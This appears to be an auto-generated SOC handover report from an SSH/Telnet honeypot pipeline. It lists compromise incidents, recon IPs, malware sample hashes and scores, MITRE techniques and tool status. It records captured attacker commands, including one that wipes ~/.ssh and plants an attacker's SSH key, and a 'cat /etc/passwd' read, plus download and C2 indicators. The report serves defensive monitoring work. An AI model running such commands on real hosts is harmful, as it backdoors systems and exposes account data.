| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 14:08:32` | `cowrie.session.connect` |
| `2026-09-05 14:08:32` | `cowrie.client.version` |
| `2026-09-05 14:08:32` | `cowrie.client.kex` |
| `2026-09-05 14:08:33` | `cowrie.login.success` |
| `2026-09-05 14:08:34` | `cowrie.session.params` |
| `2026-09-05 14:08:34` | `cowrie.command.input` |
| `2026-09-05 14:08:34` | `cowrie.command.failed` |
| `2026-09-05 14:08:34` | `cowrie.log.closed` |
| `2026-09-05 14:08:35` | `cowrie.session.params` |
| `2026-09-05 14:08:35` | `cowrie.command.input` |
| `2026-09-05 14:08:35` | `cowrie.session.file_download` |
| `2026-09-05 14:08:35` | `cowrie.log.closed` |
| `2026-09-05 14:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-529f097da11b

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-09-05 14:08 |
| **Last Seen** | 2026-09-05 14:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 14:08:35` | `cowrie.session.connect` |
| `2026-09-05 14:08:36` | `cowrie.client.version` |
| `2026-09-05 14:08:36` | `cowrie.client.kex` |
| `2026-09-05 14:08:37` | `cowrie.login.success` |
| `2026-09-05 14:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44e469e02c45

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-09-05 14:08 |
| **Last Seen** | 2026-09-05 14:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 14:08:37` | `cowrie.session.connect` |
| `2026-09-05 14:08:37` | `cowrie.client.version` |
| `2026-09-05 14:08:37` | `cowrie.client.kex` |
| `2026-09-05 14:08:38` | `cowrie.login.success` |
| `2026-09-05 14:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14eb443e64c7

| Field | Detail |
|---|---|
| **Source IP** | `8.216.46[.]15` |
| **First Seen** | 2026-09-05 14:39 |
| **Last Seen** | 2026-09-05 14:40 |
| **Session Duration** | 62s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 14:39:18` | `cowrie.session.connect` |
| `2026-09-05 14:39:18` | `cowrie.telnet.option` |
| `2026-09-05 14:39:19` | `cowrie.telnet.option` |
| `2026-09-05 14:39:19` | `cowrie.login.success` |
| `2026-09-05 14:39:20` | `cowrie.session.params` |
| `2026-09-05 14:39:20` | `cowrie.telnet.option` |
| `2026-09-05 14:39:20` | `cowrie.telnet.option` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.failed` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.failed` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.failed` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.failed` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.failed` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.failed` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.failed` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.failed` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:39:20` | `cowrie.command.input` |
| `2026-09-05 14:40:20` | `cowrie.log.closed` |
| `2026-09-05 14:40:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.216.46[.]15` to AbuseIPDB if not already reported
- [ ] Block `8.216.46[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.138[.]142` | **36** | 2026-09-05 12:59 | 2026-09-05 14:53 | 18m | 0 | `T1592` | 🟠 MEDIUM |
| `66.132.172[.]215` | **5** | 2026-09-05 12:58 | 2026-09-05 12:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `152.32.225[.]11` | **3** | 2026-09-05 13:32 | 2026-09-05 13:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]12` | **3** | 2026-09-05 14:35 | 2026-09-05 14:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]197` | **3** | 2026-09-05 14:36 | 2026-09-05 14:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.128[.]205` | **3** | 2026-09-05 13:39 | 2026-09-05 13:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]110` | **3** | 2026-09-05 13:59 | 2026-09-05 14:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]182` | **3** | 2026-09-05 12:59 | 2026-09-05 13:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]109` | **3** | 2026-09-05 13:59 | 2026-09-05 13:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]65` | **3** | 2026-09-05 12:59 | 2026-09-05 13:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]226` | **3** | 2026-09-05 13:59 | 2026-09-05 14:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-09-05 13:13 | 2026-09-05 14:13 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `52.248.42[.]113` | **2** | 2026-09-05 14:17 | 2026-09-05 14:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `176.196.176[.]122` | 1 | 2026-09-05 14:54 | 2026-09-05 14:54 | 13s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]204` | 1 | 2026-09-05 13:51 | 2026-09-05 13:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | 1 | 2026-09-05 13:44 | 2026-09-05 13:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `211.210.236[.]68` | 1 | 2026-09-05 12:55 | 2026-09-05 12:55 | 11s | 0 | `T1592` | 🟢 LOW |
| `216.244.250[.]222` | 1 | 2026-09-05 13:58 | 2026-09-05 13:58 | 11s | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | 1 | 2026-09-05 14:12 | 2026-09-05 14:12 | 7s | 0 | `T1592` | 🟢 LOW |
| `219.78.63[.]235` | 1 | 2026-09-05 14:05 | 2026-09-05 14:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-09-05 14:35 | 2026-09-05 14:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-09-05 13:38 | 2026-09-05 13:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-09-05 13:38 | 2026-09-05 13:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.181.86[.]60` | 1 | 2026-09-05 14:00 | 2026-09-05 14:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]24` | 1 | 2026-09-05 13:33 | 2026-09-05 13:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]106` | 1 | 2026-09-05 13:27 | 2026-09-05 13:27 | 17s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-09-05 14:35 | 2026-09-05 14:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `73.132.100[.]90` | 1 | 2026-09-05 14:06 | 2026-09-05 14:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.211.162[.]193` | 1 | 2026-09-05 13:31 | 2026-09-05 13:31 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `69.164.217[.]74` | US | Linode | **100** ⚠️ | 0 |
| `92.204.138[.]142` | US | Host Europe GmbH | **100** ⚠️ | 24 |
| `103.63.108[.]25` | VN | Hai Phong Brand - CMC Telecommunication Infrastructure Corporation | **100** ⚠️ | 50 |
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 0 |
| `63.249.65[.]106` | US | Cruzio | **100** ⚠️ | 0 |
| `86.211.162[.]193` | FR | Orange S.A. | **100** ⚠️ | 2 |
| `66.132.172[.]106` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `52.248.42[.]113` | US | Microsoft Corporation | **100** ⚠️ | 7 |
| `219.78.63[.]235` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 50 |
| `66.132.195[.]109` | US | Censys, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 33 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 18 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1003.008](https://attack.mitre.org/techniques/T1003/008) | 2 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 116 cases |
| Tool 34  | Credential Extractor        | ✅ 27 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 47 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (8.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 18 priority case(s) shown individually · 29 recon entry/entries in table (13 group(s) consolidating 72 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-05T16:41:32Z_
